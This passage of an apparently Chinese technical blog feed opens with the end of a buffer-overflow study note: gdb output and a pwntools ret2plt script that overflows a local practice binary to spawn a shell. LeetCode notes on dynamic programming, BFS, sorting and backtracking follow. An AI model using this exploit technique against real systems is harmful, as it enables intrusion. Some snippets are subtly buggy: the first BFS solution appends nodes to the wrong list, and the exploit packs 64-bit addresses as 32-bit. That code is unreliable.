<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">find <span class="string">&#x27;/bin/sh&#x27;</span></span></span><br><span class="line">Searching for &#x27;/bin/sh&#x27; in: None ranges</span><br><span class="line">Found 3 results, display max 3 items:</span><br><span class="line">     vuln : 0x564f073e3004 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br><span class="line">     vuln : 0x564f073e4004 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br><span class="line">libc.so.6 : 0x7fe9a4c99117 --&gt; 0x68732f6e69622f (&#x27;/bin/sh&#x27;)</span><br></pre></td></tr></table></figure>



<h3 id="3-4-EXP"><a href="#3-4-EXP" class="headerlink" title="3.4 EXP"></a>3.4 EXP</h3><p>exp的构造，首先向缓冲区中填充256个字节的‘A’ + 向对齐空间中填充16字节的‘A’ + system@PLT的地址 + exit@PLT的地址 + system_arg的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">system = <span class="number">0x1050</span></span><br><span class="line">exit = <span class="number">0x1060</span></span><br><span class="line">system_arg = <span class="number">0x559e0dd67004</span></span><br><span class="line">payload=<span class="string">&quot;A&quot;</span> * <span class="number">272</span>+p32(system)+p32(exit)+p32(system_arg)</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">io= process(argv=[<span class="string">&#x27;./vuln&#x27;</span>, payload])</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p>[1] <a href="https://gxkyrftx.github.io/2019/03/02/%E7%BB%95%E8%BF%87ASLR-%E4%B8%80/">绕过ASLR-一</a></p>
<p>[2] <a href="https://lantern.cool/note-pwn-linux-protect/index.html">Linux常用保护机制</a></p>
<p>[3] <a href="https://darkwing.moe/2019/02/21/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02-%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/">Pwn学习笔记2-内存布局</a></p>
<p>[4] <a href="https://diting0x.github.io/20170101/bypassaslr-returntoplt/">bypassaslr-returntoplt</a></p>
]]></content>
      <categories>
        <category>二进制学习笔记</category>
      </categories>
      <tags>
        <tag>二进制学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记6 - 动态规划解题模板</title>
    <url>/2024/03/20/leetcode-dp/</url>
    <content><![CDATA[<h2 id="Leetcode笔记6-动态规划"><a href="#Leetcode笔记6-动态规划" class="headerlink" title="Leetcode笔记6 - 动态规划"></a>Leetcode笔记6 - 动态规划</h2><p><strong>核心思路</strong></p>
<ul>
<li>确定状态，即问题的变量</li>
<li>确定dp方程</li>
<li>采用自底向上 &#x2F; 自顶向下的解法</li>
</ul>
<p><strong>自底向上</strong></p>
<ul>
<li>从dp(0)开始举几个例子即可</li>
<li>确定好base case，假设base case确定到dp(n)，那么for循环的变量一定要从n+1的情况开始</li>
<li>例：for循环的变量从2开始，那么一定要确定的base case是dp(0), dp(1)</li>
</ul>
<h2 id="322-零钱兑换"><a href="#322-零钱兑换" class="headerlink" title="322. 零钱兑换"></a><a href="https://leetcode.cn/problems/coin-change/">322. 零钱兑换</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">coinChange</span>(<span class="params">self, coins: <span class="type">List</span>[<span class="built_in">int</span>], amount: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment">## dp(n) = min&#123;d(n-coin)&#125; + 1, coin=1,2,5, n &gt; 0</span></span><br><span class="line">        <span class="comment">## dp(0) == 0</span></span><br><span class="line">        <span class="comment">## dp(1) == min&#123;dp(1-1), dp(1-2), dp(1-5)&#125; + 1 == dp(1-1) + 1 == 1</span></span><br><span class="line">        <span class="comment">## dp(2) == min&#123;dp(2-1), dp(2-2), dp(2-5)&#125; + 1 == dp(2-2) + 1 == 1</span></span><br><span class="line">        <span class="comment">## dp(3) == min&#123;dp(3-1), dp(3-2), dp(3-5)&#125; + 1 == dp(2) + 1 == 2</span></span><br><span class="line">        <span class="comment">## dp(4) == min&#123;dp(4-1), dp(4-2), dp(4-5)&#125; + 1 == dp(2) + 1 == 2</span></span><br><span class="line">        dp = [<span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)] * (amount + <span class="number">1</span>)</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(coin, amount + <span class="number">1</span>):</span><br><span class="line">                dp[x] = <span class="built_in">min</span>(dp[x], dp[x - coin] + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> dp[amount] <span class="keyword">if</span> dp[amount] != <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>) <span class="keyword">else</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure>



<h2 id="22-括号生成"><a href="#22-括号生成" class="headerlink" title="22. 括号生成"></a><a href="https://leetcode.cn/problems/generate-parentheses/">22. 括号生成</a></h2><p>这题可以用dp解纯粹是因为发现了一个规律，即：对于n组’()’，在’()’的不同位置，添加任意’()’，即可得到n+1的解。又即，dp(n)依赖于dp(n-1)。</p>
<p>同样的，又因为我们可以记录()的路径，我们同样可以用回溯法来解，见回溯解法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数字 n 代表生成括号的对数，请你设计一个函数，用于能够生成所有可能的并且 有效的 括号组合。</span></span><br><span class="line"><span class="comment"># 示例 1：</span></span><br><span class="line"><span class="comment"># 输入：n = 3</span></span><br><span class="line"><span class="comment"># 输出：[&quot;((()))&quot;,&quot;(()())&quot;,&quot;(())()&quot;,&quot;()(())&quot;,&quot;()()()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例 2：</span></span><br><span class="line"><span class="comment"># 输入：n = 1</span></span><br><span class="line"><span class="comment"># 输出：[&quot;()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generateParenthesis</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]: <span class="comment">## 注意，函数返回的是List</span></span><br><span class="line">        <span class="comment">## </span></span><br><span class="line">        <span class="comment">## dp[0] = 0 </span></span><br><span class="line">        <span class="comment">## dp[1] = 1  &quot;()&quot;</span></span><br><span class="line">        <span class="comment">## dp[2] = dp[1] + 2 - 1 = 2 &quot;(()), ()()&quot;</span></span><br><span class="line">        <span class="comment">## dp[3] = dp[2] + 4 - 1 = 5   &quot;((()))  (()()) (())() &quot; + &quot;()(()) ()()()&quot;</span></span><br><span class="line">        <span class="comment">## dp[n] = dp[n-1] + 2n - 1</span></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">1</span>: <span class="keyword">return</span> [<span class="string">&quot;()&quot;</span>]</span><br><span class="line">        res = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> pre_str <span class="keyword">in</span> self.generateParenthesis(n-<span class="number">1</span>): <span class="comment">## 要求dp(n)，就要用到dp(n-1)</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(pre_str) + <span class="number">1</span>):</span><br><span class="line">                res.add(pre_str[:j] + <span class="string">&quot;()&quot;</span> + pre_str[j:])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>(res)</span><br></pre></td></tr></table></figure>



<h2 id="121-买卖股票的最佳时机"><a href="#121-买卖股票的最佳时机" class="headerlink" title="121. 买卖股票的最佳时机"></a><a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock/">121. 买卖股票的最佳时机</a></h2><p>发现规律：<strong>前n天的最大收益 &#x3D; max(前n-1天的最大收益，第n天的收益 - 前n-1天的最小值)</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：[7,1,5,3,6,4]</span></span><br><span class="line"><span class="comment"># 输出：5</span></span><br><span class="line"><span class="comment"># 解释：在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。</span></span><br><span class="line"><span class="comment"># 返回你可以从这笔交易中获取的最大利润。如果你不能获取任何利润，返回 0 </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="comment"># dp[n]: 前n天的最大收益</span></span><br><span class="line">    <span class="comment"># dp[1] = 0</span></span><br><span class="line">    <span class="comment"># dp[2] = max(dp[1], prices[1]-prices[0])</span></span><br><span class="line">    <span class="comment"># dp[3] = max(dp[2], prices[2]-min(prices[0], prices[1]))</span></span><br><span class="line">    <span class="comment"># dp[n] = max(dp[n-1], prices[n-1]-min(prices[0], prices[1], ... , prices[n-2]))</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maxProfit</span>(<span class="params">self, prices: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        size = <span class="built_in">len</span>(prices)</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">1</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        dp = [<span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)]* size</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        min_val = prices[<span class="number">0</span>]</span><br><span class="line">        max_profit = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, size):</span><br><span class="line">            min_val = <span class="built_in">min</span>(prices[i-<span class="number">1</span>], min_val)</span><br><span class="line">            dp[i] = <span class="built_in">max</span>(dp[i-<span class="number">1</span>], prices[i]-min_val)</span><br><span class="line">            max_profit = <span class="built_in">max</span>(max_profit, dp[i])</span><br><span class="line">        <span class="keyword">return</span> max_profit</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这题还有一个更简单的方法，就是我们考虑遍历数组的时候，一定要考虑，<strong>有什么值是我们能维护的</strong>。</p>
<p>比如这题中，我们<strong>每遍历一天的价格</strong>，都<strong>可以维护两个值</strong>：<strong>历史最低值</strong>min_val &#x3D; min(min_val, prices[n])，<strong>最大利润值</strong>max_val&#x3D;max(max_val, price - min_val)。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maxProfit</span>(<span class="params">self, prices: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        min_val = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">        max_profit = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> price <span class="keyword">in</span> prices:</span><br><span class="line">            max_profit = <span class="built_in">max</span>(max_profit, price - min_val)</span><br><span class="line">            min_val = <span class="built_in">min</span>(min_val, price)</span><br><span class="line">        <span class="keyword">return</span> max_profit</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记5 - BFS解题模板</title>
    <url>/2024/03/20/leetcode-bfs/</url>
    <content><![CDATA[<h1 id="Leetcode笔记5-BFS"><a href="#Leetcode笔记5-BFS" class="headerlink" title="Leetcode笔记5 - BFS"></a>Leetcode笔记5 - BFS</h1><p><strong>核心思路</strong></p>
<ul>
<li>维护一个队列，队列里存放的是同一行的所有节点。</li>
<li>通过while循环每次把队列里的结点全部读掉，并且每读（pop）一个，就要将该结点的左右子结点存放进去</li>
<li>循环直到队列为空</li>
</ul>
<h2 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102. 二叉树的层序遍历"></a><a href="https://leetcode.cn/problems/binary-tree-level-order-traversal/">102. 二叉树的层序遍历</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">levelOrder</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res = []</span><br><span class="line">        queue = [root]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            <span class="comment">## 通过队列长度来遍历掉当前层的所有结点</span></span><br><span class="line">            n = <span class="built_in">len</span>(queue)</span><br><span class="line">            level = []</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">	            node = queue.pop(<span class="number">0</span>)</span><br><span class="line">                level.append(node.val)</span><br><span class="line">                <span class="keyword">if</span> node.left: level.append(node.left)</span><br><span class="line">                <span class="keyword">if</span> node.right: level.append(node.right)</span><br><span class="line">            res.append(level)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">            </span><br></pre></td></tr></table></figure>



<h2 id="199-二叉树的右视图"><a href="#199-二叉树的右视图" class="headerlink" title="199. 二叉树的右视图"></a><a href="https://leetcode.cn/problems/binary-tree-right-side-view/">199. 二叉树的右视图</a></h2><p>跟上面的唯一不同就是每层只取最右边的值作为结果返回</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">rightSideView</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        res = []</span><br><span class="line">        queue = [root]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> queue:</span><br><span class="line">            n = <span class="built_in">len</span>(queue)</span><br><span class="line">            level = []</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                node = queue.pop(<span class="number">0</span>)</span><br><span class="line">                level.append(node.val)</span><br><span class="line">                <span class="keyword">if</span> node.left: queue.append(node.left)</span><br><span class="line">                <span class="keyword">if</span> node.right: queue.append(node.right)</span><br><span class="line">            res.append(level[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记4 - 排序算法总结</title>
    <url>/2024/03/19/leetcode-sort/</url>
    <content><![CDATA[<h1 id="Leetcode笔记4-排序算法总结"><a href="#Leetcode笔记4-排序算法总结" class="headerlink" title="Leetcode笔记4 - 排序算法总结"></a>Leetcode笔记4 - 排序算法总结</h1><p>总结一把最可能面试面到的排序：<strong>快速排序</strong>和 <strong>归并排序</strong></p>
<h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><p><strong>核心思路</strong></p>
<ul>
<li>快速排序的思路是每次确定一个值，该值的左边都是比它小的，右边都是比它大的</li>
</ul>
<h3 id="215-数组中的第K个最大元素"><a href="#215-数组中的第K个最大元素" class="headerlink" title="215. 数组中的第K个最大元素"></a><a href="https://leetcode.cn/problems/kth-largest-element-in-an-array/">215. 数组中的第K个最大元素</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 快速排序的思路是每次确定一个值，该值的左边都是比它小的，右边都是比它大的</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findKthLargest</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># 治：快慢指针，快指针用于遍历并与慢指针比较，慢指针用于被置换</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            nums[high], nums[mid] = nums[mid], nums[high]</span><br><span class="line">            i = low</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(low, high):</span><br><span class="line">                <span class="keyword">if</span> nums[j] &lt;= nums[high]:</span><br><span class="line">                    nums[i], nums[j] = nums[j], nums[i]</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">            nums[i], nums[high] = nums[high], nums[i]</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">quickSort</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            <span class="keyword">if</span> low &gt;= high:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            pi = partition(nums, low, high)</span><br><span class="line">            quickSort(nums, low, pi-<span class="number">1</span>)</span><br><span class="line">            quickSort(nums, pi+<span class="number">1</span>, high)</span><br><span class="line">        </span><br><span class="line">        quickSort(nums, <span class="number">0</span>, <span class="built_in">len</span>(nums)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums[-k]</span><br></pre></td></tr></table></figure>



<h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><p><strong>核心思路</strong></p>
<ul>
<li>分成左右两个<strong>有序数组</strong>，然后要将两个数组按顺序合并好（双指针合并）</li>
<li>涉及到数组边界不清晰的时候，<strong>最好用while循环遍历数组</strong>而不用nums[low:high]的形式</li>
</ul>
<h3 id="215-数组中的第K个最大元素-1"><a href="#215-数组中的第K个最大元素-1" class="headerlink" title="215. 数组中的第K个最大元素"></a><a href="https://leetcode.cn/problems/kth-largest-element-in-an-array/">215. 数组中的第K个最大元素</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 归并排序的思路是，分成左右两个有序数组，然后要将两个数组按顺序合并好</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findKthLargest</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], k: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">nums, low, mid, high</span>): <span class="comment"># 职能是将两个有序数组按顺序合并好——双指针</span></span><br><span class="line">            i, j = low, mid+<span class="number">1</span></span><br><span class="line">            res = []</span><br><span class="line">            <span class="keyword">while</span> i &lt;= mid <span class="keyword">and</span> j &lt;= high:</span><br><span class="line">                <span class="keyword">if</span> nums[i] &lt; nums[j]: </span><br><span class="line">                    res.append(nums[i])</span><br><span class="line">                    i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: </span><br><span class="line">                    res.append(nums[j])</span><br><span class="line">                    j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> i &lt;= mid:</span><br><span class="line">                res.append(nums[i])</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> j &lt;= high:</span><br><span class="line">                res.append(nums[j])</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            nums[low:high+<span class="number">1</span>] = res[:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">sort</span>(<span class="params">nums, low, high</span>):</span><br><span class="line">            <span class="keyword">if</span> low &gt;= high:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            mid = (low + high) // <span class="number">2</span> 	<span class="comment"># 取1/2分成左右两个数组</span></span><br><span class="line">            sort(nums, low, mid)		<span class="comment"># 处理左数组</span></span><br><span class="line">            sort(nums, mid+<span class="number">1</span>, high) 	<span class="comment"># 处理右数组</span></span><br><span class="line">            merge(nums, low, mid, high) <span class="comment"># 合并左右两个数组</span></span><br><span class="line">        </span><br><span class="line">        sort(nums, <span class="number">0</span>, <span class="built_in">len</span>(nums)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums[-k]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记3 - 回溯类问题（DFS）解题模板</title>
    <url>/2024/03/14/leetcode-backtrace/</url>
    <content><![CDATA[<h1 id="Leetcode笔记3-回溯类问题-DFS"><a href="#Leetcode笔记3-回溯类问题-DFS" class="headerlink" title="Leetcode笔记3 - 回溯类问题-DFS"></a>Leetcode笔记3 - 回溯类问题-DFS</h1><h2 id="1-回溯类问题"><a href="#1-回溯类问题" class="headerlink" title="1. 回溯类问题"></a>1. 回溯类问题</h2><p>每次刷题刷完了不久就会忘记DFS的很多细节。。直到看到了东哥的<a href="https://mp.weixin.qq.com/s/nMUHqvwzG2LmWA9jMIHwQQ">回溯算法详解</a>，才从根上理解了这一类算法的底层原理。</p>
<p>对于我这种看到算法就头疼的选手，还真得靠这种大佬帮忙梳理总结底层原理才行。。</p>
<p><strong>核心框架 &amp;&amp; 解题模板</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 定义：</span></span><br><span class="line"><span class="comment">#1、路径：当前已经做过的所有选择</span></span><br><span class="line"><span class="comment">#2、选择列表：当前结点可以做的选择</span></span><br><span class="line"><span class="comment">#3、结束条件：即到达决策树底层，无法再做选择的条件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 核心框架</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">路径，选择列表</span>)：</span><br><span class="line">	<span class="keyword">if</span> 满足结束条件：</span><br><span class="line">    	<span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> 选择 <span class="keyword">in</span> 选择列表：</span><br><span class="line">        <span class="comment">#做选择</span></span><br><span class="line">        backtrace()</span><br><span class="line">        <span class="comment">#撤销选择</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> 选择 <span class="keyword">in</span> 选择列表：</span><br><span class="line">	<span class="comment"># 做选择</span></span><br><span class="line">    选择列表.remove(当前选择)</span><br><span class="line">    路径.add(当前选择)</span><br><span class="line">    <span class="comment"># 回溯</span></span><br><span class="line">    backtrace(路径，选择列表)</span><br><span class="line">    <span class="comment"># 撤销选择</span></span><br><span class="line">    路径.remove(当前选择)</span><br><span class="line">    选择列表.add(当前选择)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="49-子集"><a href="#49-子集" class="headerlink" title="49. 子集"></a><a href="https://leetcode.cn/problems/subsets/">49. 子集</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：nums = [1,2,3]</span></span><br><span class="line"><span class="comment"># 输出：[[],[1],[2],[1,2],[3],[1,3],[2,3],[1,2,3]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 按照回溯的思想，有前序和后序两种方式</span></span><br><span class="line"><span class="comment">## 1、如果是前序执行，则路径的记录顺序应该为:</span></span><br><span class="line"><span class="comment">## [],[1],[1,2],[1,2,3],(从这里开始回撤)[1,3],(再次回撤)[2],[2,3],(再次回撤)[3]</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subsets</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = [] <span class="comment"># 记录最终结果</span></span><br><span class="line">        track = [] <span class="comment"># 维护当前路径</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums, start</span>):</span><br><span class="line">            res.append(track[:]) <span class="comment"># 把当前路径记录到最终结果里</span></span><br><span class="line">            <span class="comment">## 模板</span></span><br><span class="line">            <span class="comment">## 注意，这里的nums就是我们可以做出选择的选择列表;</span></span><br><span class="line">            <span class="comment">## 且这里的隐藏结束条件是for循环到头</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, <span class="built_in">len</span>(nums)): </span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums, i+<span class="number">1</span>)</span><br><span class="line">                <span class="comment">## 回撤</span></span><br><span class="line">                track.pop()</span><br><span class="line">        backtrace(nums, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line"><span class="comment">## 2、也可以后序执行，则路径的记录顺序为：</span></span><br><span class="line"><span class="comment">## [1,2,3],[1,2],(这里开始有个回撤)[1,3],(再次回撤)[1],(再次回撤)[2,3],(再次回撤)[2],(再次回撤)[3],(自己补一个)[]</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subsets</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = [] <span class="comment"># 记录最终结果</span></span><br><span class="line">        track = [] <span class="comment"># 维护当前路径</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums, start</span>):</span><br><span class="line">            <span class="comment">## 模板</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, <span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums, i+<span class="number">1</span>)</span><br><span class="line">                <span class="comment">## 撤回选择</span></span><br><span class="line">                track.pop()</span><br><span class="line">            res.append(track[:])</span><br><span class="line">        backtrace(nums, <span class="number">0</span>)</span><br><span class="line">        res.append([])</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="46-全排列"><a href="#46-全排列" class="headerlink" title="46. 全排列"></a><a href="https://leetcode.cn/problems/permutations/description/">46. 全排列</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：nums = [1,2,3]</span></span><br><span class="line"><span class="comment"># 输出：[[1,2,3],[1,3,2],[2,1,3],[2,3,1],[3,1,2],[3,2,1]]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">permute</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = []</span><br><span class="line">        track = []</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(track) == <span class="built_in">len</span>(nums):</span><br><span class="line">                res.append(track[:])</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="keyword">if</span> nums[i] <span class="keyword">in</span> track: <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums)</span><br><span class="line">                <span class="comment">## 撤销选择</span></span><br><span class="line">                track.pop()</span><br><span class="line">                </span><br><span class="line">        backtrace(nums)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="22-括号生成"><a href="#22-括号生成" class="headerlink" title="22. 括号生成"></a><a href="https://leetcode.cn/problems/generate-parentheses/">22. 括号生成</a></h3><p>此题同样可以通过动态规划求解，因为我们发现对于n组’()’，在’()’的不同位置，添加任意’()’，即可得到n+1的解。又即，dp(n)依赖于dp(n-1)。详细解法见动态规划类解题模板。</p>
